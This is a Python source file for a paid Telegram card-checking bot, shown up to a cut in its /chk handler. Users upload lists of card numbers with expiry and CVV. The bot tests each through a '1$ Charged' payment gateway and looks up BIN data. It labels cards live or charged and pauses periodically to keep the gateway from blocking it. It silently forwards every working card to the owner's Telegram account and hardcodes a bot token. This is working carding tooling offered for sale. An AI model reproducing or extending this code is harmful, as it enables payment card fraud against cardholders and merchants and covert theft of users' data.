import requests
import telebot
import time
import random
from telebot import TeleBot, types
from telebot.types import Message
from gatet import Tele
from urllib.parse import urlparse
import sys
import time
import requests
import os
import string
import logging
import re
        
token = "7959620740:AAFAHbQYPrW2KXmzwog4lMiv0XQUVgJ0aEM" 
bot=telebot.TeleBot(token,parse_mode="HTML")

owners = ["1172862169"]
        
# Function to check if the user's ID is in the id.txt file
def is_user_allowed(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            allowed_ids = [id.strip() for id in allowed_ids]  # Clean any extra spaces/newlines
            if str(user_id) in allowed_ids:
                return True
    except FileNotFoundError:
        print("id.txt file not found. Please create it with user IDs.")
    return False

def add_user(user_id):
    with open("id.txt", "a") as file:
        file.write(f"{user_id}\n")
        
    try:
        bot.send_message(user_id, "You have been successfully added to the authorized list. You now have access to the bot.")
    except Exception as e:
        print(f"Failed to send DM to {user_id}: {e}")

def remove_user(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
        with open("id.txt", "w") as file:
            for line in allowed_ids:
                if line.strip() != str(user_id):
                    file.write(line)
        
        try:
            bot.send_message(user_id, "You have been removed from the authorized list. You no longer have access to the bot.")
        except Exception as e:
            print(f"Failed to send DM to {user_id}: {e}")

    except FileNotFoundError:
        print("id.txt file not found. Cannot remove user.")
        
valid_redeem_codes = {}  # Changed to dictionary to store code info

def generate_redeem_code(duration_days=1):
    prefix = "BLACK"
    suffix = "NUGGET"
    main_code = '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    code = f"{prefix}-{main_code}-{suffix}"
    
    # Calculate expiration time
    expiration_time = time.time() + (duration_days * 24 * 60 * 60)
    
    # Store code with expiration info
    valid_redeem_codes[code] = {
        'expiration': expiration_time,
        'duration_days': duration_days,
        'created_by': 'owner'
    }
    
    return code, expiration_time

@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.chat.id) == '1172862169':
        try:
            # Parse duration from command
            parts = message.text.split()
            duration_days = 1  # Default 1 day
            
            if len(parts) > 1:
                try:
                    duration_days = int(parts[1])
                    if duration_days < 1:
                        duration_days = 1
                    elif duration_days > 365:
                        duration_days = 365  # Max 1 year
                except ValueError:
                    duration_days = 1
            
            new_code, expiration_time = generate_redeem_code(duration_days)
            
            # Format expiration date
            expiration_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(expiration_time))
            
            # Get bot username
            bot_info = bot.get_me()
            bot_username = bot_info.username
            
            bot.reply_to(
                message, 
                f"<b>🎉 New Redeem Code Generated 🎉</b>\n\n"
                f"<b>Code:</b> <code>{new_code}</code>\n"
                f"<b>Duration:</b> {duration_days} day(s)\n"
                f"<b>Expires:</b> {expiration_date}\n\n"
                f"<code>/redeem {new_code}</code>\n"
                f"Use this code to redeem your access!\n\n"
                f"🤖 <b>Bot:</b> @{bot_username}",
                parse_mode="HTML"
            )
        except Exception as e:
            bot.reply_to(message, f"Error generating code: {str(e)}")
    else:
        bot.reply_to(message, "You do not have permission to generate redeem codes.🚫")

LOGS_GROUP_CHAT_ID = -4970290554

@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    try:
        redeem_code = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Please provide a valid redeem code. Example: /redeem BLACK-XXXX-XXXX-XXXX-NUGGET")
        return

    if redeem_code in valid_redeem_codes:
        code_info = valid_redeem_codes[redeem_code]
        current_time = time.time()
        
        # Check if code has expired
        if current_time > code_info['expiration']:
            # Remove expired code
            del valid_redeem_codes[redeem_code]
            bot.reply_to(message, "This redeem code has expired. Please contact @god_forever for a new code.")
            return
        
        if is_user_allowed(message.chat.id):
            bot.reply_to(message, "You already have access to the bot. Redeeming again is not allowed.")
        else:
            add_user(message.chat.id)
            # Remove the used code
            del valid_redeem_codes[redeem_code]
            
            # Calculate remaining time
            remaining_time = code_info['expiration'] - current_time
            remaining_days = int(remaining_time // (24 * 60 * 60))
            remaining_hours = int((remaining_time % (24 * 60 * 60)) // (60 * 60))
            
            bot.reply_to(
                message, 
                f"<b>✅ Redeem Code Successfully Redeemed!</b>\n\n"
                f"<b>Code:</b> <code>{redeem_code}</code>\n"
                f"<b>Duration:</b> {code_info['duration_days']} day(s)\n"
                f"<b>Access Granted:</b> {remaining_days}d {remaining_hours}h remaining\n\n"
                f"You now have access to the bot! 🎉",
                parse_mode="HTML"
            )
            
            # Log the redemption to the logs group
            username = message.from_user.username or "No Username"
            log_message = (
                f"<b>🎉 Redeem Code Redeemed</b>\n"
                f"<b>Code:</b> <code>{redeem_code}</code>\n"
                f"<b>Duration:</b> {code_info['duration_days']} day(s)\n"
                f"<b>By:</b> @{username} (ID: <code>{message.chat.id}</code>)"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
    else:
        bot.reply_to(message, "Invalid redeem code. Please check and try again.")

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or "No Username"
    
    # Show user ID for debugging
    bot.reply_to(message, f"Your Telegram User ID is: {user_id}\nUsername: @{username}")
    
    if is_user_allowed(user_id):
        bot.reply_to(message, "You're authorized! Send the file to see the magic 🪄✨")
    else:
        bot.reply_to(message, f"""
You Are Not Authorized to Use this Bot

Your User ID: {user_id}
Required Owner ID: 1172862169

⤿ 𝙋𝙧𝙞𝙘𝙚 𝙇𝙞𝙨𝙩 ⚡
⤿ 1 day - 90rs/3$ 
★ 7 days - 180rs/6$ 
★ 1 month - 400rs/18$ 
★ lifetime - 800rs/20$ 

Dm @ghostxdy Tᴏ Bᴜʏ Pʀᴇᴍɪᴜm""")

@bot.message_handler(commands=["debug"])
def debug_card(message):
    if str(message.from_user.id) in owners:  # Only owner can debug
        try:
            # Extract the card number from the command
            if len(message.text.split()) < 2:
                bot.reply_to(message, "Please provide a card number to debug.\n\n<b>Usage:</b>\n<code>/debug 4743691099526774|02|2027|530</code>", parse_mode="HTML")
                return
            
            cc = message.text.split('/debug ')[1]
            username = message.from_user.username or "N/A"

            bot.reply_to(message, "🔍 <b>Debugging card...</b>\n\n⏳ Please wait...", parse_mode="HTML")

            # Get the raw response from the `Tele` function
            try:
                raw_response = str(Tele(cc))
                bot.reply_to(message, f"🔍 <b>Debug Results</b>\n\n<b>Card:</b> <code>{cc}</code>\n<b>Raw Response:</b>\n<code>{raw_response}</code>", parse_mode="HTML")
            except Exception as e:
                bot.reply_to(message, f"❌ <b>Debug Error</b>\n\n<b>Card:</b> <code>{cc}</code>\n<b>Error:</b> {str(e)}", parse_mode="HTML")
        except Exception as e:
            bot.reply_to(message, f"❌ Unexpected error: {str(e)}")
    else:
        bot.reply_to(message, "🚫 You are not authorized to use debug commands.")

@bot.message_handler(commands=["help", "commands"])
def help_command(message):
    user_id = message.from_user.id
    
    if is_user_allowed(user_id):
        help_text = f"""
🤖 <b>Card Checker Bot - Help</b>

👤 <b>Your ID:</b> <code>{user_id}</code>
✅ <b>Status:</b> Authorized

📋 <b>Available Commands:</b>

<b>For Card Checking:</b>
• <code>/check CARD</code> - Check single card (private chat)
• <code>/single CARD</code> - Same as /check
• <code>/chk CARD</code> - Check single card (group only)
• Upload .txt file - Check multiple cards

<b>For Information:</b>
• <code>/start</code> - Get your User ID
• <code>/info</code> - Show your information
• <code>/help</code> - Show this help message
• <code>/chatid</code> - Show chat information

<b>Card Format:</b>
<code>4532640527811643|12|2025|123</code>

<b>Support:</b> @god_forever
"""
    else:
        help_text = f"""
🤖 <b>Card Checker Bot - Help</b>

👤 <b>Your ID:</b> <code>{user_id}</code>
❌ <b>Status:</b> Not Authorized

📋 <b>Available Commands:</b>
• <code>/start</code> - Get your User ID
• <code>/info</code> - Show your information
• <code>/help</code> - Show this help message

🔐 <b>To Get Access:</b>
Contact @god_forever for authorization

<b>Support:</b> @god_forever
"""
    
    bot.reply_to(message, help_text, parse_mode="HTML")

LOGS_GROUP_CHAT_ID = -4970290554 # Replace with your logs group chat ID

@bot.message_handler(commands=["add"])
def add(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            user_id_to_add = message.text.split()[1]  # Get the user ID from the command
            add_user(user_id_to_add)
            bot.reply_to(message, f"User {user_id_to_add} added to the authorized list.")
            
            # Send log to logs group
            log_message = (
                f"<b>🚀 User Added</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_add}</code>\n"
                f"🔗 <b>By:</b> @{message.from_user.username or 'No Username'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID to add.")
    else:
        bot.reply_to(message, "You are not authorized to perform this action.")

@bot.message_handler(commands=["remove"])
def remove(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            user_id_to_remove = message.text.split()[1]  # Get the user ID from the command
            remove_user(user_id_to_remove)
            bot.reply_to(message, f"User {user_id_to_remove} removed from the authorized list.")
            
            # Send log to logs group
            log_message = (
                f"<b>🗑️ User Removed</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_remove}</code>\n"
                f"🔗 <b>By:</b> @{message.from_user.username or 'No Username'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID to remove.")
    else:
        bot.reply_to(message, "You are not authorized to perform this action.")
        
@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = message.chat.id
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile Link</a>"

    # Check user status
    if str(user_id) in owners:
        status = "Owner 👑"
    elif is_user_allowed(user_id):
        status = "Authorised ✅"
    else:
        status = "Not-Authorised ❌"

    # Formatted response
    response = (
        f"🔍 <b>Your Info</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"👤 <b>First Name:</b> {first_name}\n"
        f"👤 <b>Last Name:</b> {last_name}\n"
        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
        f"📛 <b>Username:</b> @{username}\n"
        f"🔗 <b>Profile Link:</b> {profile_link}\n"
        f"📋 <b>Status:</b> {status}"
    )
    
    bot.reply_to(message, response, parse_mode="HTML")
	
def is_bot_stopped():
    return os.path.exists("stop.stop")


@bot.message_handler(content_types=["document"])
def main(message):
	if not is_user_allowed(message.from_user.id):
		bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @god_forever")
		return
	dd = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
	username = message.from_user.username or "N/A"
	file_info = bot.get_file(message.document.file_id)
	if file_info.file_path:
		ee = bot.download_file(file_info.file_path)
	else:
		bot.reply_to(message, "Error: Could not get file path")
		return
		
	with open("combo.txt", "wb") as w:
		w.write(ee)
		
		start_time = time.time()
		
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			if total > 2001:
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"🚨 Oops! This file contains {total} CCs, which exceeds the 2000 CC limit! ?? Please provide a file with fewer than 500 CCs for smooth processing. 🔥")
				return
				
			for cc in lino:
				current_dir = os.getcwd()
				for filename in os.listdir(current_dir):
					if filename.endswith(".stop"):
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @god_forever')
						os.remove('stop.stop')
						return
			
				try:
					data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
					
				except:
					pass
				try:
					bank=(data['bank'])
				except:
					bank=('N/A')
				try:
					brand=(data['brand'])
				except:
					brand=('N/A')
				try:
					emj=(data['country_flag'])
				except:
					emj=('N/A')
				try:
					cn=(data['country_name'])
				except:
					cn=('N/A')
				try:
					dicr=(data['level'])
				except:
					dicr=('N/A')
				try:
					typ=(data['type'])
				except:
					typ=('N/A')
				try:
					url=(data['bank']['url'])
				except:
					url=('N/A')
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"• Charged ✅: [ {ch} ] •", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"• CCN ✅ : [ {live} ] •", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• DEAD ❌ : [ {dd} ] •", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 : [ {total} ] •", callback_data='x')
				cm6 = types.InlineKeyboardButton(" STOP 🛑 ", callback_data='stop')
				mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
𝒃𝒚 ➜ @god_forever''', reply_markup=mes)
				
				try:
					last = str(Tele(cc))
				except Exception as e:
					print(e)
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "Your card was declined."
				
				msg = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: VBV/CVV.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲:  @god_forever'''
				print(last)
				if "requires_action" in last:
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
					live += 1
					
					# Send to owner
					try:
						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
					except:
						pass
						
				elif "Your card is not supported." in last:
					live += 1
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
					
					# Send to owner
					try:
						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
					except:
						pass
						
				elif "Your card's security code is incorrect." in last:
					live += 1
					msg_cvv = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: CVV Incorrect (Card is Live)

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
					send_telegram_notification(msg_cvv)
					bot.reply_to(message, msg_cvv)
					
					# Send to owner
					try:
						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg_cvv}", parse_mode="HTML")
					except:
						pass
						
				elif "succeeded" in last:
					ch += 1
					elapsed_time = time.time() - start_time
					msg1 = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅@god_forever
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Checked Successfully

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @ghostxdy'''
					send_telegram_notification(msg1)
					bot.reply_to(message, msg1)
					
					# Send to owner
					try:
						bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg1}", parse_mode="HTML")
					except:
						pass
				else:
					dd += 1
					
				checked_count = ch + live + dd
				if checked_count % 50 == 0:
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="Taking a 1-minute break... To Prevent Gate from Dying, Please wait ⏳")
					time.sleep(60)
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"Resuming the Process, Sorry for the Inconvience")
					
	except Exception as e:
		print(e)
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅

Charged CC : {ch}
CCN : {live}
Dead CC : {dd}
Total : {total}

𝗕𝗢𝗧 𝗕𝗬 ➜ @''')
		
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	with open("stop.stop", "w") as file:
		pass
	bot.answer_callback_query(call.id, "Bot will stop processing further tasks.")
	bot.send_message(call.message.chat.id, "The bot has been stopped. No further tasks will be processed.")
	
@bot.message_handler(commands=["show_auth_users", "sau", "see_list", "users"])
def show_auth_users(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            with open("id.txt", "r") as file:
                allowed_ids = file.readlines()
            
            if not allowed_ids:
                bot.reply_to(message, "📊 <b>User Statistics</b>\n\n👥 <b>Total Users:</b> 0\n📝 <b>Status:</b> No authorized users found.", parse_mode="HTML")
                return
            
            # Count total users
            total_users = len(allowed_ids)
            
            # Prepare the message with user IDs and usernames
            user_list = f"📊 <b>User Statistics</b>\n\n👥 <b>Total Users:</b> {total_users}\n\n📋 <b>Authorized Users:</b>\n"
            
            for i, user_id in enumerate(allowed_ids, 1):
                user_id = user_id.strip()  # Clean any extra spaces/newlines
                try:
                    user = bot.get_chat(user_id)
                    username = user.username or "No Username"
                    first_name = user.first_name or "N/A"
                    user_list += f"{i}. @{username} ({first_name})\n   ID: <code>{user_id}</code>\n\n"
                except Exception as e:
                    user_list += f"{i}. User ID: <code>{user_id}</code>\n   Status: Username not found\n\n"
            
            # Add summary
            user_list += f"📈 <b>Summary:</b>\n• Total Authorized Users: {total_users}\n• Owner: @god_forever\n• Bot Status: Active ✅"
            
            # Send the list to the owner
            bot.reply_to(message, user_list, parse_mode="HTML")
        except FileNotFoundError:
            bot.reply_to(message, "📊 <b>User Statistics</b>\n\n❌ <b>Error:</b> id.txt file not found.\n👥 <b>Total Users:</b> 0", parse_mode="HTML")
    else:
        bot.reply_to(message, "🚫 You are not authorized to view user statistics.")

@bot.message_handler(commands=["codes", "active_codes"])
def show_active_codes(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        if not valid_redeem_codes:
            bot.reply_to(message, "📋 <b>Active Redeem Codes</b>\n\n❌ No active codes found.", parse_mode="HTML")
            return
        
        codes_message = "📋 <b>Active Redeem Codes</b>\n\n"
        current_time = time.time()
        
        for code, info in valid_redeem_codes.items():
            # Check if code is expired
            if current_time > info['expiration']:
                continue  # Skip expired codes
            
            expiration_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(info['expiration']))
            remaining_time = info['expiration'] - current_time
            remaining_days = int(remaining_time // (24 * 60 * 60))
            remaining_hours = int((remaining_time % (24 * 60 * 60)) // (60 * 60))
            
            codes_message += f"🔑 <b>Code:</b> <code>{code}</code>\n"
            codes_message += f"⏰ <b>Duration:</b> {info['duration_days']} day(s)\n"
            codes_message += f"📅 <b>Expires:</b> {expiration_date}\n"
            codes_message += f"⏳ <b>Remaining:</b> {remaining_days}d {remaining_hours}h\n\n"
        
        if codes_message == "📋 <b>Active Redeem Codes</b>\n\n":
            codes_message += "❌ No active codes found."
        
        bot.reply_to(message, codes_message, parse_mode="HTML")
    else:
        bot.reply_to(message, "🚫 You are not authorized to view active codes.")

@bot.message_handler(commands=["stats", "count", "user_count"])
def user_stats(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            with open("id.txt", "r") as file:
                allowed_ids = file.readlines()
            
            total_users = len(allowed_ids) if allowed_ids else 0
            
            stats_message = f"""
📊 <b>Quick User Statistics</b>

👥 <b>Total Users:</b> {total_users}
👑 <b>Owner:</b> @god_forever
🤖 <b>Bot Status:</b> Active ✅

💡 <b>Commands:</b>
• /users - Detailed user list
• /stats - Quick statistics
• /add USER_ID - Add user
• /remove USER_ID - Remove user
"""
            bot.reply_to(message, stats_message, parse_mode="HTML")
        except FileNotFoundError:
            bot.reply_to(message, "📊 <b>Quick Statistics</b>\n\n👥 <b>Total Users:</b> 0\n❌ <b>Error:</b> id.txt not found", parse_mode="HTML")
    else:
        bot.reply_to(message, "🚫 You are not authorized to view statistics.")

@bot.message_handler(commands=["check", "single"])
def single_check(message):
    try:
        # Check if user is authorized
        if not is_user_allowed(message.from_user.id):
            bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @god_forever")
            return
        
        # Check if it's a private chat
        if message.chat.type != "private":
            bot.reply_to(message, "This command can only be used in private chat with the bot.")
            return
        
        # Extract the card number from the command
        if len(message.text.split()) < 2:
            bot.reply_to(message, "Please provide a valid card number.\n\n<b>Usage:</b>\n<code>/check 4532640527811643|12|2025|123</code>\n<code>/single 4532640527811643|12|2025|123</code>", parse_mode="HTML")
            return
        
        cc = message.text.split('/check ')[1] if '/check ' in message.text else message.text.split('/single ')[1]
        username = message.from_user.username or "N/A"

        try:
            initial_message = bot.reply_to(message, "🔍 <b>Checking your card...</b>\n\n⏳ Please wait while I process your request...", parse_mode="HTML")
        except telebot.apihelper.ApiTelegramException:
            initial_message = bot.send_message(message.chat.id, "🔍 <b>Checking your card...</b>\n\n⏳ Please wait while I process your request...", parse_mode="HTML")

        # Get the response from the `Tele` function
        try:
            last = str(Tele(cc))
        except Exception as e:
            print(f"Error in Tele function: {e}")
            last = "An error occurred."

        # Fetch BIN details
        try:
            response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
            if response.status_code == 200:
                data = response.json()  # Parse JSON
            else:
                print(f"Error: Received status code {response.status_code}")
                data = {}
        except Exception as e:
            print(f"Error fetching BIN data: {e}")
            data = {}

        # Extract details with fallback values
        bank = data.get('bank', 'N/A')
        brand = data.get('brand', 'N/A')
        emj = data.get('country_flag', 'N/A')
        cn = data.get('country_name', 'N/A')
        dicr = data.get('level', 'N/A')
        typ = data.get('type', 'N/A')
        url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'
        
        # Improved response parsing
        last_lower = last.lower()
        
        if "requires_action" in last_lower or "vbv" in last_lower or "3d" in last_lower:
            message_ra = f'''✅ <b>LIVE CARD FOUND!</b>

💳 <b>Card:</b> <code>{cc}</code>
🏦 <b>Gateway:</b> 1$ Charged
📊 <b>Response:</b> VBV/3D Secure Required

ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
🏛️ <b>Issuer:</b> {bank}
🌍 <b>Country:</b> {cn} {emj}

⏱️ <b>Time:</b> 0 seconds
👤 <b>Checked By:</b> @{username}
🤖 <b>Bot By:</b> @god_forever'''
            bot.edit_message_text(message_ra, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
            
            # Send to owner
            try:
                bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{message_ra}", parse_mode="HTML")
            except:
                pass
                
        elif "succeeded" in last_lower or "success" in last_lower or "approved" in last_lower or "charged" in last_lower:
            msg_sec = f'''✅ <b>CHARGED CARD FOUND!</b>

💳 <b>Card:</b> <code>{cc}</code>
🏦 <b>Gateway:</b> 1$ Charged
📊 <b>Response:</b> Card Charged Successfully

ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
🏛️ <b>Issuer:</b> {bank}
🌍 <b>Country:</b> {cn} {emj}

⏱️ <b>Time:</b> 0 seconds
👤 <b>Checked By:</b> @{username}
🤖 <b>Bot By:</b> @god_forever'''
            bot.edit_message_text(msg_sec, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
            
            # Send to owner
            try:
                bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
            except:
                pass
                
        elif "security code is incorrect" in last_lower or "cvv" in last_lower or "cvc" in last_lower:
            # This is a LIVE card with wrong CVV
            msg_live = f'''✅ <b>LIVE CARD FOUND!</b>

💳 <b>Card:</b> <code>{cc}</code>
🏦 <b>Gateway:</b> 1$ Charged
📊 <b>Response:</b> CVV Incorrect (Card is Live)

ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
🏛️ <b>Issuer:</b> {bank}
🌍 <b>Country:</b> {cn} {emj}

⏱️ <b>Time:</b> 0 seconds
👤 <b>Checked By:</b> @{username}
🤖 <b>Bot By:</b> @god_forever'''
            bot.edit_message_text(msg_live, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
            
            # Send to owner
            try:
                bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg_live}", parse_mode="HTML")
            except:
                pass
                
        elif "declined" in last_lower or "failed" in last_lower or "error" in last_lower or "invalid" in last_lower:
            msg_dec = f'''❌ <b>CARD DECLINED</b>

💳 <b>Card:</b> <code>{cc}</code>
🏦 <b>Gateway:</b> 1$ Charged
📊 <b>Response:</b> Card Declined

ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
🏛️ <b>Issuer:</b> {bank}
🌍 <b>Country:</b> {cn} {emj}

⏱️ <b>Time:</b> 0 seconds
👤 <b>Checked By:</b> @{username}
🤖 <b>Bot By:</b> @god_forever'''
            bot.edit_message_text(msg_dec, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
        else:
            # Unknown response - show raw response for debugging
            msg_unknown = f'''❓ <b>UNKNOWN RESPONSE</b>

💳 <b>Card:</b> <code>{cc}</code>
🏦 <b>Gateway:</b> 1$ Charged
📊 <b>Response:</b> {last[:100]}...

ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
🏛️ <b>Issuer:</b> {bank}
🌍 <b>Country:</b> {cn} {emj}

⏱️ <b>Time:</b> 0 seconds
👤 <b>Checked By:</b> @{username}
🤖 <b>Bot By:</b> @god_forever'''
            bot.edit_message_text(msg_unknown, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
            
    except Exception as e:
        print(f"Unexpected error: {e}")
        bot.reply_to(message, "❌ An unexpected error occurred. Please try again later.")

@bot.message_handler(commands=["chatid"])
def get_chat_id(message):
    chat_id = message.chat.id
    chat_type = message.chat.type
    chat_title = message.chat.title or "Private Chat"
    username = message.from_user.username or "No Username"
    
    response = f"""
🔍 <b>Chat Information</b>

📋 <b>Chat Type:</b> {chat_type}
🆔 <b>Chat ID:</b> <code>{chat_id}</code>
📛 <b>Chat Title:</b> {chat_title}
👤 <b>Your Username:</b> @{username}

💡 <b>How to use:</b>
• For private chats: Use the ID as is
• For groups: Add minus sign (-) before the ID
• For channels: Add -100 before the ID

📝 <b>Example:</b>
• Private chat: <code>1172862169</code>
• Group: <code>-4970290554</code>
• Channel: <code>-1001234567890</code>
"""
    
    bot.reply_to(message, response, parse_mode="HTML")
        
print("DONE ✅")

allowed_group = -4970290554
last_used = {}

@bot.message_handler(commands=["chk"])
def chk(message):
    try:
        # Check if user is authorized
        if not is_user_allowed(message.from_user.id):
            bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @god_forever")
            return
        
        # Allow both private chats and the designated group
        if message.chat.type == "private":
            # Private chat - allow single card checking
            pass
        elif message.chat.id != allowed_group:
            bot.reply_to(message, "This command can only be used in the designated group. User Must Join the Group @TGSPOOFERS")
            return
    
        user_id = message.from_user.id  # Get user ID
        current_time = time.time()  # Get the current timestamp

        # Check if the user is in cooldown
        if user_id in last_used and current_time - last_used[user_id] < 25:
            remaining_time = 25 - int(current_time - last_used[user_id])
            bot.reply_to(message, f"Please wait {remaining_time} seconds before using this command again.")
            return

        # Update the last usage timestamp
        last_used[user_id] = current_time
        
        # Extract the card number from the command
        if len(message.text.split()) < 2:
            bot.reply_to(message, "Please provide a valid card number. Usage: /chk card_number")
            return
        
        cc = message.text.split('/chk ')[1]
        username = message.from_user.username or "N/A"

        try:
            initial_message = bot.reply_to(message, "Your card is being checked, please wait...")
        except telebot.apihelper.ApiTelegramException:
            initial_message = bot.send_message(message.chat.id, "Your card is being checked, please wait...")

        # Get the response from the `Tele` function
        try:
            last = str(Tele(cc))
        except Exception as e:
            print(f"Error in Tele function: {e}")
            last = "An error occurred."

        # Fetch BIN details
        try:
            response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
            if response.status_code == 200:
                data = response.json()  # Parse JSON
            else:
                print(f"Error: Received status code {response.status_code}")
                data = {}
        except Exception as e:
            print(f"Error fetching BIN data: {e}")
            data = {}

        # Extract details with fallback values
        bank = data.get('bank', 'N/A')
        brand = data.get('brand', 'N/A')
        emj = data.get('country_flag', 'N/A')
        cn = data.get('country_name', 'N/A')
        dicr = data.get('level', 'N/A')
        typ = data.get('type', 'N/A')
        url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'
        
